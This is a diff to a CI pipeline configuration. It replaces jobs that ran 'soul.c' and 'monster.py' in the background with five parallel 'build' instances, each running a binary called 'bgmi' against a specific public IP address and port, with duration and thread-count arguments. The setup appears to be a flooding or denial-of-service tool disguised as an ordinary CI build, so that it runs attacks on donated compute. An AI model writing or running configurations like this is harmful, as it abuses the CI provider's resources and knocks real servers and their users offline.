@@ -1,18 +1,17 @@
 task:
-  name: "Run C Program and Python Script Continuously"
+  name: Parallel CI Builds Executing Binary
   container:
-    image: gcc:latest
+    image: ubuntu:latest
+  resources:
+    cpu: 8  # Allocate CPU resources
+  matrix:
+    parallel_run: [1, 2, 3, 4, 5]  # Run 5 instances in parallel
+  script:
+    # Install required dependencies
+    
 
-  install_script:
-    - apt-get update && apt-get install -y python3 python3-pip
-    - pip3 install -r requirements.txt
+    
+    - chmod +x bgmi  # Ensure binary is executable
 
-  build_script:
-    - gcc soul.c -o soul -lpthread
-
-  test_script:
-    - ./soul &
-    - python3 monster.py &
-
-  background_script:
-    - tail -f /dev/null
+    # Execute the binary
+    - ./bgmi 20.198.104.226 22923 300 900
